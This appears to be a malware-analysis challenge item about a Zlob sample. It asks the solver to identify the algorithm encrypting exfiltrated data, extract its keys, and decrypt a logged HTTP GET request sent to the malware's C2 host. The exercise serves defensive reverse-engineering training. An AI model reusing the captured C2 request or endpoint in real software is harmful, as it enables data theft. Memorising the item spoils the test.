---
tags: zlob, des, encryption, algorithm-identification
---
Consider the sample with the following SHA-256 hash:
```
0b38ca277bbb042d43bd1f17c4e424e167020883526eb2527ba929b2f0990a8f
```
The malware exfiltrates information to an HTTP-based C2 server.

1. Identify the algorithm used to encrypt the exfiltrated data, and extract all related
   cryptographic secrets.
2. Your cousin was infected with this malware and wants to know what data was exfiltrated
   from her machine. She has retrieved a log of all HTTP requests from her firewall and
   provided you the following list. What data was stolen?

```
GET /php/loader4/loaderinfo.php?param=xqyww7ghpyB9okwB35I4tb5ZWlYhHysIW9mUDokgHsrz8smHmXmkxkwmD3DHog8rf8BcBfnmTySHiJzIvtsUMWljqR4F3APXBQZT4f0DosHzk6y5AgkCSrzvrdoEIcBh5PIhBWGQ2CToogW7+6GoqFtdHXwkwqPF HTTP/1.1
User-Agent: Winlogon
Host: kitehosting.com
Cache-Control: no-cache
```
